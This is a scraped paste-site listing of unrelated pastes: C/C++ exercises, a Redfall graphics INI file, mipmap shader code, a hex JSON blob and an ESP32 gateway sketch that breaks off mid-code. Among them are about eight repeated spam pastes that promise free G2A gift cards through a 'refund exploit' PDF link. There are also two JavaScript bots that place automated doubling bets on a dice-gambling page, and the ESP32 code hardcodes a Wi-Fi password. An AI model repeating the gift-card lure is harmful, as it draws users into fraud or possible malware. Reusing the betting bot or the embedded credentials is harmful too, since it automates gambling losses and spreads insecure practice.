$('#a_lo').click();
setTimeout(() => go(), 100);
}
go();"
RagJKXGp,Untitled,dllbridge,C,Saturday 25th of May 2024 07:52:37 AM CDT,"

#include   <stdio.h>
#include  <string.h>  
 
struct C_CPU
{
    
       char  szNameCPU[17];
       int   nIndxPassMark;
       int   nTDP;
       int   nYear; 
       int   nCores;
       int   nThreads;
       char  szSocket  [17];
       char  szModelCPU[17];
       int   nTechProcess;
};
 
void printInfoCPU(C_CPU *p);  
 
 
//////////////////////////////////////////////////////////////
int main()
{
    
    C_CPU  myCPU ;
    C_CPU  myCPU2;
    C_CPU  myC   ; 
 
 
    strcpy(myCPU.szNameCPU,  ""N5000"");
    myCPU.nIndxPassMark      = 2442  ;
    myCPU.nTDP               =    6  ;
    myCPU.nYear              = 2017  ;
	myCPU.nCores             =    4  ;
    myCPU. nThreads          =    4  ;
    strcpy(myCPU .szSocket, ""FCBGA1090"");
    strcpy(myCPU. szModelCPU,""Pentium"");
    myCPU.nTechProcess       =14;
    //*** * * * * *  * * * * * *
    
    strcpy(myCPU2.szNameCPU, ""N4020   "");
    myCPU2.nIndxPassMark     = 1556 ;
    myCPU2.nTDP              =   6  ;
    myCPU2.nYear             =  2019 ;
    myCPU2.nCores            =   2    ;  
    myCPU2.nThreads           =   4 ;
       strcpy(  myCPU2.szSocket,""170"") ;
      strcpy (  myCPU2.szModelCPU , ""170"");
   
    strcpy(myC.szNameCPU, ""J1800"");
    myC.nIndxPassMark     =  590  ;
    myC.nTDP              =   10  ;
    myC.nYear             = 2013 ;
    myC.nCores            =    2  ; 
   myC.nThreads             =  2;
  strcpy( myC.szSocket , "" 1090"");
    strcpy(  myC.szModelCPU,"" 1170"");

    
    
  
          
    printInfoCPU(&myCPU );      
	     
    printInfoCPU(&myCPU2);          
    printInfoCPU(&myC   );
  
return 0;
}
 
/////////////////////////////////////////////////////////////
void printInfoCPU(C_CPU *p)                                // 
{
     
     printf(""Name of CPU %s \n"", p->szNameCPU     ); 
     printf(""Passmark =  %5d\n"", p->nIndxPassMark ); 
     printf(""TDP      =  %5d\n"", p->nTDP          ); 
     printf(""Year     =  %5d\n"", p->nYear         );
     printf(""Cores    =  %5d\n"", p->nCores        );
     printf(""Threads  =  %5d\n"", p->nThreads      );
     printf(""Socket   =  %s \n"", p->szSocket      );
     printf(""ModelCPU =  %s \n"", p->szModelCPU    );
	 printf(""nTechProcess= %d\n"",p-> nTechProcess );
     printf(""- - - - - - - - - - - - - \n""        );
     
     
     

    
}



"
gxSskEkv,Ejer7_TP6,orlandoju,C++,Saturday 25th of May 2024 07:26:04 AM CDT,"/*
Se ingresa por teclado en un vector de 10 elementos, 9 n√∫meros todos distintos entre siÃÅ y ordenados de menor a mayor. Se pide ingresar otro valor e insertarlo en el orden correspondiente y desplazar todos los elementos un lugar.

Ejemplo:
Vector ‚Üí {1 3 4 5 6 7 10 12 16}
N√∫mero ingresado: 9
Vector ‚Üí {1 3 4 5 6 7 9 10 12 16}

*/

#include <iostream>
#include <clocale>
using namespace std;


int main(){

	setlocale(LC_ALL, """");
    int aux;
    int const NUMCARGA=4;
    int vecnum[NUMCARGA];
        for(int i=0 ; i<NUMCARGA; i++){
        cout<<""Ingrese un numero: ""<<endl;
        cin>>vecnum[i];
     cout<<""------------------""<<endl;
     }
        for(int i=0; i<NUMCARGA;i++)
        {
            for(int j=i+1; j<NUMCARGA; j++)
                {
                    if(vecnum[i]>vecnum[j])
                    {
                        aux=vecnum[i];
                        vecnum[i]=vecnum[j];
                        vecnum[j]=aux;

                    }
                }
        }

        cout<<"" \n vector ordenado de menor a mayor: "";

        for(int i=0; i< NUMCARGA; i++){
            cout<<vecnum[i] << "" - "";
        }



return 0;
}
"
130cf53y,Redfall: GameUserSettings.ini,Mancubuss,INI file,Saturday 25th of May 2024 06:57:52 AM CDT,"[ScalabilityGroups]
sg.AntiAliasingQuality = 4 
sg.EffectsQuality = 5
sg.FoliageQuality = 5
sg.PostProcessQuality = 5
sg.ResolutionQuality = 100 
sg.ShadingQuality = 5
sg.ShadowQuality = 5
sg.TextureQuality = 5
sg.ViewDistanceQuality = 5
sg.ViewDistanceScale = 10

[/Script/Engine.RendererSettings]
foliage.LODDistanceScale = 100
r.AmbientOcclusionLevels = 6
r.AmbientOcclusionMaxQuality = -100
r.AmbientOcclusionRadiusScale = 1.5
r.AntiAliasingMode = 4
r.BloomQuality = 8
r.CachedMeshDrawCombinedSize = 0
r.CachedMeshDrawCombiners = 0
r.DefaultFeature.AmbientOcclusionStaticFraction = 1.0
r.DefaultFeature.AntiAliasing = 4
r.DefaultFeature.AutoExposure.ExtendDefaultLuminanceRange = 1
r.DefaultFeature.AutoExposure.Method = 2
r.DefaultFeature.Bloom = 1
r.DepthFieldUI = 800.0
r.DepthOfFieldQuality = 5
r.DepthOfFieldUI = 800.0
r.DepthOfFieldVignetteIntensity = 0.0
r.DynamicGlobalIlluminationMethod = 2  ; Enables accurate dynamic global illumination
r.EmitterSpawnRateScale = 2
r.FoliageDisableInsideLODBoundsDist = 0
r.FoliageDisableOutsideLODBoundsDist = 0
r.FoliageDiscardInsideConservativeBoundsDist = 0
r.FoliageDiscardOutsideConservativeBoundsDist = 0
r.FoliageMinAllowedOpacityValue = 0.0
r.FoliageQuality = 4
r.FoliageSaveWithMinOpacityValue = 0.0
r.ForceStaticDecoders = 1
r.GrassDensity = 4
r.HZBOcclusion = 1  ; Enables horizon-based ambient occlusion
r.MaterialQualityLevel = 1
r.MaxAnisotropy = 16
r.MaxQualityMode = 1
r.MaxTesselatedGeometryAMD = 2147483647  ; Sets maximum tessellation multiplier for AMD GPUs
r.MaxTesselatedGeometryNVIDIA = 2147483647  ; Sets maximum tessellation multiplier for NVIDIA GPUs
r.MipMapLODBias = -13
r.MotionBlurQuality = 5
r.Motionblurquality = 0
r.PostProcessAASharpness = -1.0
r.SSR.Quality = 4
r.SceneColorFringeMax = 0.0
r.Shadow.CSM.MaxCascades = 10
r.Shadow.CSM.TransitionScale = 2
r.Shadow.DistanceScale = 4
r.Shadow.MaxCSMResolution = 4096
r.Shadow.MaxResolution = 4096
r.Shadow.RadiusThreshold = 0.01
r.Shadow.SpotLightTransitionScale = 4096
r.Shadow.TransitionScale = 4096
r.SkeletalMeshLODBias = -1
r.SpeedTreeFrondRippleDamping = 1.0
r.SpeedTreeLeafAngle = 1
r.SpeedTreeLeafAnimationViewer = 1
r.SpeedTreewind = 1
r.StaticDecoderCompressionQuality = 1
r.StaticMeshLODDistanceScale = 0.001
r.Streaming.HLODStrategy = 2
r.Streaming.LimitPoolSizeToVRAM = 0
r.Streaming.MaxTempMemoryAllowed = 256
r.Streaming.MaxTempMemoryPoolSize = 4096
r.Streaming.MipBias = -1
r.Streaming.PoolSize = 4096
r.TemporalAA.Upsampling = 1
r.TemporalAACurrentFrameWeight = 0.05
r.TemporalAASamples = 16
r.TessellationAdaptivePixelDistanceThreshold = 0.0  ; Disables adaptive tessellation for maximum quality
r.TessellationAllMeshes = 1  ; Enables tessellation for all meshes
r.TextureQuality = 4
r.Tonemapper.Sharpen = 1
r.ViewDistanceScale = 10

[/Script/Redfall.ArkGameUserSettings]
AudioQualityLevel = 0
Brightness = -50
ChromaticAberrationEnabled = False
CinematicVolume = 100.000000
ConsoleTextScale = 1.000000
Contrast = 5
CursorSensitivity = 1.000000
DLSSFrameGenerationEnabled = True
DLSSQuality = 1
DepthOfFieldEnabled = True
DesiredScreenHeight = 720
DesiredScreenWidth = 1280
DisplaySelectionIndex = 0
EffectsScalabilityLevel = 5
FSR2Quality = 1
FSR2Sharpening = 0.000000
FieldOfViewConstraint = 0
FieldOfViewVertical = 88.507149
FoliageScalabilityLevel = 5
FrameRateLimit = 120.000000
FullscreenMode = 1
GraphicsMode = 0
HDRBrightness = 0
HDRContrast = 0
HDRDisplayOutputNits = 1000
HDREnabled = True
LastCPUBenchmarkResult = 209.001450
LastCPUBenchmarkSteps = 141.941605
LastCPUBenchmarkSteps = 254.707825
LastConfirmedAudioQualityLevel = 0
LastConfirmedFullscreenMode = 1
LastGPUBenchmarkMultiplier = 1.000000
LastGPUBenchmarkResult = 1404.767944
LastGPUBenchmarkSteps = 1004.944458
LastGPUBenchmarkSteps = 1594.665405
LastGPUBenchmarkSteps = 1798.586914
LastGPUBenchmarkSteps = 2848.877686
LastGPUBenchmarkSteps = 4616.264648
LastGPUBenchmarkSteps = 477.400421
LastGPUBenchmarkSteps = 658.411072
LastRecommendedScreenHeight = -1.000000
LastRecommendedScreenWidth = -1.000000
LastUserConfirmedDesiredScreenHeight = 720
LastUserConfirmedDesiredScreenWidth = 1280
LastUserConfirmedResolutionSizeX = 3840
LastUserConfirmedResolutionSizeY = 2160
MotionBlurScale = 0.000000
MouseSensitivity = 4.000000
MusicVolume = 100.000000
NvidiaReflex = 1
PostProcessingScalabilityLevel = 5
PreferredFullscreenMode = 0
RayTracedAmbientOcclusion = False
RayTracedDirectIllumination = False
RayTracedGlobalIllumination = False
RayTracedReflections = False
RayTracedShadows = False
RayTracingEnabled = False
ResolutionSizeX = 3840
ResolutionSizeY = 2160
SFXVolume = 100.000000
ShadingScalabilityLevel = 5
ShadowScalabilityLevel = 5
TextScale = 1.000000
TextureScalabilityLevel = 5
UpscalingMode = 2
Version = 5
VerticalSyncType = 0
ViewDistanceScalabilityLevel = 5
VivoxAudioInputDevice = 
VivoxAudioOutputDevice = 
VivoxChatAdditionalTimeDelay = 5.000000
VivoxChatMaxTimeDelay = 60.000000
VivoxChatTimeDelayBase = 5.000000
VivoxTTSVoice = 0
VivoxVoiceChatVolume = 80.000000
VoiceChatMethod = 0
VoiceVolume = 100.000000
WindowPosX = 0
WindowPosY = 0
XeSSQuality = 2
bHasRunScalabilityBenchmark = True
bScreenNarrationEnabled = False
bUseDynamicResolution = False
bUseHDRDisplayOutput = True
bUseVSync = False
bVivoxEnabled = False
bVivoxSSTEnabled = False
bVivoxTTSEnabled = False
bWasInitialPlatformScreenNarrationSettingRespected = False

[Internationalization]
ShouldUseLocalizedNumericInput = True

[/Script/Redfall.RedfallScalabilitySettings]
bEnableHighQualityMaterials = True
bEnableHighQualityShadows = True

[/Script/Engine.GameUserSettings]
bUseVSync = True
Version = 5
bUseDesiredScreenHeight = False

[ShaderPipelineCache.CacheFile]
LastOpened = Redfall"
0wkYc494,amazing snowybot 3.14,coinwalk,JavaScript,Saturday 25th of May 2024 06:49:21 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/240).toFixed(8));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var winnerdinner = (elderly*2.4);
var snowy = ((Math.floor(elderly/tens))*tens);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var fart = 1;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great<=(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great>=(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(snowy-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if (((great/40)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*fart)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 1;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 100);
}
go();"
rEAgjJ9V,Generate mipmaps for HiZ,Zgragselus,C++,Saturday 25th of May 2024 06:12:42 AM CDT,"compute->SetPipelineState(mMipmapPS);
compute->SetRootSignature(mMipmapRS);
compute->SetDescriptorHeap(Engine::DescriptorHeap::CBV_SRV_UAV, heap);

compute->TransitionResource(mColorBuffer, RESOURCE_STATE_UNORDERED_ACCESS, true);

int todo = mNumMipmaps - 1;
int base = 0;
int dimension[2] = { (int)mWidth, (int)mHeight };

while (todo != 0)
{
	int mipLevels = 3;

	int npotflag = 0;
	if (((dimension[0] % 2) == 1) && ((dimension[1] % 2) == 1))
	{
		npotflag = 3;
	}
	else if ((dimension[1] % 2) == 1)
	{
		npotflag = 2;
	}
	else if ((dimension[0] % 2) == 1)
	{
		npotflag = 1;
	}

	if (todo == 1)
	{
		mipLevels = 1;
	}
	else if (todo == 2)
	{
		mipLevels = 2;
	}

	int dispatch[2] = { 0, 0 };
	dispatch[0] = dimension[0] / 8;
	if ((dimension[0] % 8) > 0)
	{
		dispatch[0]++;
	}

	dispatch[1] = dimension[1] / 8;
	if ((dimension[1] % 8) > 0)
	{
		dispatch[1]++;
	}

	if (dispatch[0] == 0 && dispatch[1] > 0)
	{
		dispatch[0] = 1;
	}
	else if (dispatch[0] > 0 && dispatch[1] == 0)
	{
		dispatch[1] = 1;
	}
	else if (dispatch[0] == 0 && dispatch[1] == 0)
	{
		break;
	}

	compute->SetConstants(0, Engine::DWParam(base), Engine::DWParam(npotflag), Engine::DWParam(1.0f / (float)dimension[0]), Engine::DWParam(1.0f / (float)dimension[1]));
	compute->SetConstants(1, Engine::DWParam(mipLevels), Engine::DWParam(mipLevels), Engine::DWParam(mipLevels), Engine::DWParam(mipLevels));
	compute->SetDescriptorTable(2, mColorBuffer->GetSRV());
	compute->SetDescriptorTable(3, mColorBuffer->GetUAV(base + 1));
	if (mipLevels >= 2) { compute->SetDescriptorTable(4, mColorBuffer->GetUAV(base + 2)); }
	if (mipLevels >= 3) { compute->SetDescriptorTable(5, mColorBuffer->GetUAV(base + 3)); }
	compute->Dispatch(dispatch[0], dispatch[1], 1);
	compute->TransitionResource(mColorBuffer, RESOURCE_STATE_UNORDERED_ACCESS, true);

	todo -= mipLevels;
	base += mipLevels;
	dimension[0] /= 2 << (mipLevels - 1);
	dimension[1] /= 2 << (mipLevels - 1);
}"
xm5Tgvv7,Generate mipmaps max,Zgragselus,C,Saturday 25th of May 2024 06:09:43 AM CDT,"[numthreads(8, 8, 1)]
void GenerateMipmapsMax(uint GI : SV_GroupIndex, uint3 DTid : SV_DispatchThreadID)
{
	SAMPLER_TYPE src0;
	SAMPLER_TYPE src1;
	SAMPLER_TYPE src2;
	SAMPLER_TYPE src3;
	
	SAMPLER_TYPE max0;

	// Sample each pixel and perform max when needed due to non-power-of-two
	float2 uv = (DTid.xy + 0.5f) * texelSize;
	if (npotFlag == 0)
	{
		src0 = srcLevel.SampleLevel(srcSampler, uv, srcMiplevel);
	}
	else if (npotFlag == 1)
	{
		src0 = max(srcLevel.SampleLevel(srcSampler, uv, srcMiplevel), srcLevel.SampleLevel(srcSampler, uv + float2(texelSize.x, 0.0f), srcMiplevel));
	}
	else if (npotFlag == 2)
	{
		src0 = max(srcLevel.SampleLevel(srcSampler, uv, srcMiplevel), srcLevel.SampleLevel(srcSampler, uv + float2(0.0f, texelSize.y), srcMiplevel));
	}
	else
	{
		src0 = max(max(srcLevel.SampleLevel(srcSampler, uv, srcMiplevel), srcLevel.SampleLevel(srcSampler, uv + float2(texelSize.x, 0.0f), srcMiplevel)),
			max(srcLevel.SampleLevel(srcSampler, uv + float2(0.0f, texelSize.y), srcMiplevel), srcLevel.SampleLevel(srcSampler, uv + float2(texelSize.x, texelSize.y), srcMiplevel)));
	}
	StoreColor(GI, src0);
	GroupMemoryBarrierWithGroupSync();

	if ((GI & 0x9) == 0)
	{
		src1 = LoadColor(GI + 0x01);
		src2 = LoadColor(GI + 0x08);
		src3 = LoadColor(GI + 0x09);

		max0 = max(max(src0, src1), max(src2, src3));

		mipLevel1[DTid.xy / 2] = max0;

		StoreColor(GI, max0);
	}

	if (mipLevels == 1)
	{
		return;
	}

	GroupMemoryBarrierWithGroupSync();

	if ((GI & 0x1B) == 0)
	{
		src1 = LoadColor(GI + 0x02);
		src2 = LoadColor(GI + 0x10);
		src3 = LoadColor(GI + 0x12);

		max0 = max(max(src0, src1), max(src2, src3));

		mipLevel2[DTid.xy / 4] = max0;

		StoreColor(GI, max0);
	}

	if (mipLevels == 2)
	{
		return;
	}

	GroupMemoryBarrierWithGroupSync();

	if (GI == 0)
	{
		src1 = LoadColor(GI + 0x04);
		src2 = LoadColor(GI + 0x20);
		src3 = LoadColor(GI + 0x24);

		max0 = max(max(src0, src1), max(src2, src3));

		mipLevel3[DTid.xy / 8] = max0;
	}
}"
TG7dGLUm,data937,TestGuy1,JSON,Saturday 25th of May 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '334de33de066fe349e9a297211d7b3f75816b6b3e781ea8085c8d7903ee62892ecef01c29ca7a1ced74a83057d795892264b046bfc9d8b1ed0e9a8e0b50e96ffc849cfc19e8eb1e49eca9303fee2bba7af819126522d5bd2bec00d66e230e0902384ddbae49f8ffaf65f80d4a91f17f8670cc315c48b98a43b4ebcafc81f6e11',
  otherdata: [
    'c29697b8d54f00530b013a6c10df3eb2',
    '72e065f5013293085030cf803ea502d2',
    'c831fb482fa1daa612425f8d65e0c311',
    '59db7d74316b752fc0bb47236db55ed2',
    '7bd507e41664e1058ffa5d8e138bbe93',
    '5525cac303bb7af9abfd3cf91d1e1f58',
    '9c40230b183daf8e3766bf28421567a3',
    'ec975b2dd982001c5bc2cb0834bc3d8a'
  ]
}"
5d7cRrnU,amazing snowybot 3.14,coinwalk,JavaScript,Saturday 25th of May 2024 05:55:49 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/240).toFixed(8));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var winnerdinner = (elderly*2.4);
var snowy = ((Math.floor(elderly/tens))*tens);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var fart = 1;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great<=(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great>=(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(snowy-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if (((great/4)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*fart)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 1;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 100);
}
go();"
QcBGnmxs,Untitled,35657,C++,Saturday 25th of May 2024 05:11:14 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <fstream>
#include <Windows.h>

using namespace std;

struct contact {
	char name[40];
	char mobile_phone[20];
	char home_phone[20];
	char work_phone[20];
};


void add_contact(const char* name, const char* mobile_phone, const char* home_phone, const char* work_phone) {

	ofstream fout;
	fout.open(""base.txt"", ios::app);

	if (!fout.is_open()) {
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {
		fout << name << endl << mobile_phone << endl << home_phone << endl << work_phone << endl << endl;

		fout.close();
	}

}

void del_contact(const char* name) {

	ifstream fin;
	ofstream fout;
	fin.open(""base.txt"");
	fout.open(""base2.txt"");

	if (!fin.is_open() || !fout.is_open()) {
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {

		contact cont;

		while (!fin.eof()) {
			fin >> cont.name >> cont.mobile_phone >> cont.home_phone >> cont.work_phone;

			if (strcmp(name, cont.name)) {
				fout << cont.name << endl << cont.mobile_phone << endl << cont.home_phone << endl << cont.work_phone << endl << endl;
			}
		}
		fin.close();
		fout.close();
		remove(""base.txt"");
		rename(""base2.txt"", ""base.txt"");
	}
}

void find_contact_name(const char* name) {
	ifstream fin;
	fin.open(""base.txt"");

	if (!fin.is_open()) {
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {

		contact cont;

		while (!fin.eof()) {
			fin >> cont.name >> cont.mobile_phone >> cont.home_phone >> cont.work_phone;

			if (!strcmp(name, cont.name)) {
				cout << cont.name << endl << cont.mobile_phone << endl << cont.home_phone << endl << cont.work_phone << endl << endl;
			}
		}
		fin.close();
	}
}

void show_all_contacts() {
	ifstream fin;
	fin.open(""base.txt"");

	if (!fin.is_open()) {
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {

		contact cont;

		while (!fin.eof()) {
			fin >> cont.name >> cont.mobile_phone >> cont.home_phone >> cont.work_phone;

			cout << cont.name << endl << cont.mobile_phone << endl << cont.home_phone << endl << cont.work_phone << endl << endl;
		}
		fin.close();
	}
}

int main() {

	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);


	add_contact(""–ò–≤–∞–Ω"", ""+79111111111"", ""111111"", ""222222"");
	add_contact(""–û–ª—è"", ""+79111114444"", ""111144"", ""222244"");
	add_contact(""–ñ–µ–Ω—è"", ""+79111115555"", ""111155"", ""222255"");
	add_contact(""–°–∞—à–∞"", ""+79111116666"", ""111166"", ""222266"");

	show_all_contacts();

	del_contact(""–ñ–µ–Ω—è"");

	show_all_contacts();

	find_contact_name(""–°–∞—à–∞"");
}"
VTSdDyyp,Untitled,Josif_tepe,C++,Saturday 25th of May 2024 04:48:59 AM CDT,"#include <iostream>
#include <set>
using namespace std;

int main()
{
    int n, m;
    cin >> n >> m;

    int h[n], t[m];
    multiset<int> ms;
    for(int i = 0; i < n; i++) {
        cin >> h[i];
        ms.insert(h[i]);
    }
    for(int i = 0; i < m; i++) {
        cin >> t[i];
    }
    for(int i = 0; i < m; i++) {
        auto it = ms.upper_bound(t[i]);
        if(it == ms.begin()) {
            cout << -1 << endl;
        }
        else {
             it--;
        cout << *it << endl;
        ms.erase(it);
        }
       
    }

    return 0;
}
"
PC9BrnYB,üí∞G2A.com Free Gift Card Guide May 2024 FIXüí∞,Alfonso1119,Python,Saturday 25th of May 2024 04:31:32 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_1651718.pdf

Working as of:

25 May 2024"
cdLbCdJb,Untitled,Josif_tepe,C++,Saturday 25th of May 2024 04:28:05 AM CDT,"#include <iostream>
#include <set>
using namespace std;

int main()
{
    multiset<int> ms;
    ms.insert(2);
    ms.insert(3);
    ms.insert(4);
    ms.insert(5);
    ms.insert(6);

    multiset<int>::iterator it = ms.lower_bound(3);

    
    it--;
    cout << *it << endl;
    
    return 0;
}
"
CwXd9s25,üöÄG2A.com Free Gift Card Guide May 2024 FIXüöÄ,Garoam,Python,Saturday 25th of May 2024 04:25:37 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_1651718.pdf

Working as of:

25 May 2024"
9sQjVc62,üöÄG2A.com Free Gift Card Guide May 2024 FIXüöÄ,atakan1983,Python,Saturday 25th of May 2024 04:19:39 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_1651718.pdf

Working as of:

25 May 2024"
uTDyugmP,üí∏G2A.com Free Gift Card Guide May 2024 FIXüéâ,lookos13,Python,Saturday 25th of May 2024 04:13:43 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_1651718.pdf

Working as of:

25 May 2024"
DNmLCgJu,üéâG2A.com Free Gift Card Guide May 2024 FIXüí∞,pestinha,Python,Saturday 25th of May 2024 04:07:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_1651718.pdf

Working as of:

25 May 2024"
FjLp1uvZ,üöÄG2A.com Free Any Gift Guide MAY 2024 FIXüéâ,pestinha,Python,Saturday 25th of May 2024 04:06:08 AM CDT,"Leaked G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_0662733.pdf

Working as of:

25 May 2024"
FSvEieDB,Untitled,Josif_tepe,C++,Saturday 25th of May 2024 03:59:19 AM CDT,"#include <bits/stdc++.h>
using namespace std;


int main()
{
    int n, m;
    cin >> n >> m;

    vector<int> tickets(n), people(m);
    multiset<int> ms;
    for(int i = 0; i < n; i++) {
        cin >> tickets[i];
        ms.insert(tickets[i]);
    }

    for(int i = 0; i < m; i++) {
        cin >> people[i];
        auto it = ms.upper_bound(people[i]);
        if(it == ms.begin()) {
            cout << -1 << endl;
        }
        else {
            it--;
            cout << *it << endl;
            ms.erase(it);
        }
    }
    
    return 0;
}
"
WXrpPZwc,üéâG2A.com Free Gift Card MAY 2024 FIXüöÄ,atakan1983,Python,Saturday 25th of May 2024 03:53:40 AM CDT,"Leaked G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_2684136.pdf

Working as of:

25 May 2024"
NeMUQ4wk,üéâG2A.com Free Gift Card MAY 2024 FIXüî•,lookos13,Python,Saturday 25th of May 2024 03:47:34 AM CDT,"Leaked G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_2684136.pdf

Working as of:

25 May 2024"
K7vy1XZU,Tugas Akhir - ESP32 Gateway v1.0.1,mudhita_triari,C++,Saturday 25th of May 2024 03:41:56 AM CDT,"#include <Arduino.h>
#include <painlessMesh.h>
#include <PubSubClient.h>
#include <WiFiClient.h>

#define MESH_PREFIX 	""INDOBOT FSID""
#define MESH_PASSWORD 	""INDOBOTACADEMY""
#define MESH_PORT 5555

#define STATION_SSID ""vivo V29""
#define STATION_PASSWORD ""Nabila041185""

#define HOSTNAME ""MQTT_Bridge2""

// Prototipe
void receivedCallback(const uint32_t &from, const String &msg);
void mqttCallback(char* topic, byte* payload, unsigned int length);
IPAddress getLocalIP();

IPAddress myIP(0, 0, 0, 0);
const char* mqttBroker = ""broker.emqx.io"";
const int mqttPort = 1883;
const char* mqttUser = ""emqx"";
const char* mqttPassword = ""public"";

painlessMesh mesh;
WiFiClient wifiClient;
PubSubClient mqttClient(wifiClient);

void setup() {
  Serial.begin(115200);

  mesh.setDebugMsgTypes(ERROR | STARTUP | CONNECTION); 				// Set sebelum init() untuk melihat pesan startup

  // Inisialisasi jaringan mesh
  mesh.init(MESH_PREFIX, MESH_PASSWORD, MESH_PORT, WIFI_AP_STA);
  mesh.onReceive(&receivedCallback);

  // Terhubung ke jaringan Wi-Fi yang ditentukan
  mesh.stationManual(STATION_SSID, STATION_PASSWORD);
